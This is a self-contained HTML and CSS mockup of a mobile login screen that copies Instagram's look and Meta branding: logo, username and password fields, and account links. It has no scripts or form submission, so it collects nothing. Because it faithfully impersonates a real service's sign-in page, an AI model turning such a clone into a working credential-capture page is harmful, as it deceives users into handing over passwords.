<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login Screen</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    html, body {
      height: 100%;
      background-color: #161616;
      color: #f1f1f1;
    }

    body {
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      min-height: 100dvh;
      padding: 12px 16px 22px;
    }

    /* Top Header */
    .header {
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 44px;
      width: 100%;
    }

    .back-btn {
      position: absolute;
      left: 0;
      width: 38px;
      height: 38px;
      border-radius: 50%;
      border: none;
      background-color: #262626;
      color: #e4e4e4;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    .lang-btn {
      display: flex;
      align-items: center;
      gap: 5px;
      background: transparent;
      border: none;
      color: #a8a8a8;
      font-size: 13px;
      font-weight: 400;
      cursor: pointer;
    }

    /* Center Section */
    .center-wrapper {
      width: 100%;
      max-width: 420px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo-container {
      margin-bottom: 84px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .form-group {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .input-box {
      width: 100%;
      height: 54px;
      padding: 0 16px;
      border-radius: 14px;
      border: 1px solid #383838;
      background-color: #212121;
      color: #f5f5f5;
      font-size: 15px;
      outline: none;
      transition: border-color 0.15s ease;
    }

    .input-box::placeholder {
      color: #9a9a9a;
      font-weight: 400;
    }

    .input-box:focus {
      border-color: #6b6b6b;
    }

    .login-btn {
      width: 100%;
      height: 46px;
      margin-top: 2px;
      border-radius: 999px;
      border: none;
      background-color: #0064e0;
      color: #ffffff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.15s ease;
    }

    .login-btn:active {
      background-color: #0054bd;
    }

    .forgot-link {
      margin-top: 18px;
      color: #f1f1f1;
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
      text-align: center;
    }

    /* Bottom Footer */
    .footer {
      width: 100%;
      max-width: 420px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 18px;
    }

    .create-btn {
      width: 100%;
      height: 44px;
      border-radius: 999px;
      border: 1px solid #1d65c1;
      background: transparent;
      color: #4599ff;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
    }

    .create-btn:active {
      background-color: rgba(69, 153, 255, 0.08);
    }

    .meta-brand {
      display: flex;
      align-items: center;
      gap: 6px;
      color: #e5e5e5;
      font-size: 15px;
      font-weight: 500;
      letter-spacing: 0.2px;
    }
  </style>
</head>
<body>
  <!-- Top Bar -->
  <header class="header">
    <button class="back-btn" type="button" aria-label="Go back">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <line x1="19" y1="12" x2="5" y2="12"></line>
        <polyline points="12 19 5 12 12 5"></polyline>
      </svg>
    </button>

    <button class="lang-btn" type="button">
      <span>English (UK)</span>
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="6 9 12 15 18 9"></polyline>
      </svg>
    </button>
  </header>

  <!-- Main Content -->
  <main class="center-wrapper">
    <div class="logo-container" aria-hidden="true">
      <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
        <defs>
          <radialGradient id="igGrad" cx="0.28" cy="1.05" r="1.25">
            <stop offset="0%" stop-color="#ffd600" />
            <stop offset="28%" stop-color="#ff7a00" />
            <stop offset="55%" stop-color="#ff0069" />
            <stop offset="82%" stop-color="#d300c5" />
            <stop offset="100%" stop-color="#7638fa" />
          </radialGradient>
        </defs>
        <!-- Outer rounded frame -->
        <rect x="6" y="6" width="52" height="52" rx="15" stroke="url(#igGrad)" stroke-width="5.2" />
        <!-- Inner lens circle -->
        <circle cx="32" cy="32" r="12.2" stroke="url(#igGrad)" stroke-width="5.2" />
        <!-- Top-right dot -->
        <circle cx="46.5" cy="17.5" r="3.2" fill="url(#igGrad)" />
      </svg>
    </div>

    <div class="form-group">
      <input
        class="input-box"
        type="text"
        placeholder="Username, email address or mobile number"
        autocomplete="off"
      />
      <input
        class="input-box"
        type="password"
        placeholder="Password"
      />
      <button class="login-btn" type="button">Log in</button>
    </div>

    <a class="forgot-link" href="#">Forgotten password?</a>
  </main>

  <!-- Footer -->
  <footer class="footer">
    <button class="create-btn" type="button">Create new account</button>
    <div class="meta-brand">
      <svg width="20" height="14" viewBox="0 0 28 18" fill="none">
        <path
          d="M7.6 2.5C4.4 2.5 2 5.2 2 8.9C2 12.6 4.4 15.5 7.5 15.5C9.8 15.5 11.6 14 14 10.2C16.4 14 18.2 15.5 20.5 15.5C23.6 15.5 26 12.6 26 8.9C26 5.2 23.6 2.5 20.4 2.5C18 2.5 16.2 4.2 14 7.7C11.8 4.2 10 2.5 7.6 2.5Z"
          stroke="#e5e5e5"
          stroke-width="2.3"
          stroke-linecap="round"
          stroke-linejoin="round"
        />
      </svg>
      <span>Meta</span>
    </div>
  </footer>
</body>
                </html>
